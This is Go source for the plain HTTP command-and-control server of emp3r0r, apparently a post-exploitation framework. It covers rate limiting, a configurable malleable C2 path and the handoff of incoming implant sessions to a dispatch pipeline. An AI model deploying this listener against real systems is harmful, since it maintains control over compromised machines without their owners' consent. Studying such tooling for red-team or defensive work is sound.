package server

import (
	"fmt"
	"net"
	"net/http"
	"sync"

	"golang.org/x/time/rate"

	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

type ipRateLimiter struct {
	ips sync.Map
}

func (l *ipRateLimiter) getLimiter(ip string) *rate.Limiter {
	if val, ok := l.ips.Load(ip); ok {
		return val.(*rate.Limiter)
	}
	newLimiter := rate.NewLimiter(rate.Limit(10), 20) // 10 rps per IP, burst of 20
	val, _ := l.ips.LoadOrStore(ip, newLimiter)
	return val.(*rate.Limiter)
}

var (
	globalLimiter = rate.NewLimiter(rate.Limit(100), 200) // 100 rps globally, burst of 200
	ipLimiter     = &ipRateLimiter{}
)

// StartC2HTTPServer starts the plain HTTP transport server.
func StartC2HTTPServer() {
	if live.RuntimeConfig.CCHTTPPort == "" {
		logging.Errorf("StartC2HTTPServer: CCHTTPPort is not set in config")
		return
	}

	mux := http.NewServeMux()
	registerPreflightFeature(mux)

	c2Path := live.RuntimeConfig.MalleableC2.C2Path
	if c2Path == "" {
		c2Path = "/"
	}
	mux.HandleFunc(c2Path, func(w http.ResponseWriter, req *http.Request) {
		// Rate limiting
		ip, _, err := net.SplitHostPort(req.RemoteAddr)
		if err != nil {
			ip = req.RemoteAddr
		}

		if !transport.IsActiveHTTPServerSession(req, &live.RuntimeConfig.MalleableC2) {
			if !ipLimiter.getLimiter(ip).Allow() || !globalLimiter.Allow() {
				logging.Warningf("C2 HTTP Server: rate limit exceeded for %s", req.RemoteAddr)
				http.Error(w, "Too Many Requests", http.StatusTooManyRequests)
				return
			}
		}

		stream, err := transport.HandleHTTPServerSession(w, req, &live.RuntimeConfig.MalleableC2)
		if err == transport.ErrPollingRequest {
			// It was a polling internal multiplexing request, handled successfully
			return
		}
		if err != nil {
			logging.Errorf("C2 HTTP Server Accept error from %s: %v", req.RemoteAddr, err)
			return
		}
		if stream != nil {
			// New session established, start C2 dispatch pipeline
			logging.Debugf("C2 HTTP Server: new session started from %s", req.RemoteAddr)
			go cborStreamAccept(transport.NewStreamTransport(stream, req.RemoteAddr))
		}
	})

	server := &http.Server{
		Addr:    fmt.Sprintf(":%s", live.RuntimeConfig.CCHTTPPort),
		Handler: mux,
	}

	logging.Successf("🚀 Starting plain HTTP C2 server at port %s", live.RuntimeConfig.CCHTTPPort)
	if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		logging.Fatalf("Failed to start plain HTTP C2 server at *:%s: %v", live.RuntimeConfig.CCHTTPPort, err)
	}
}
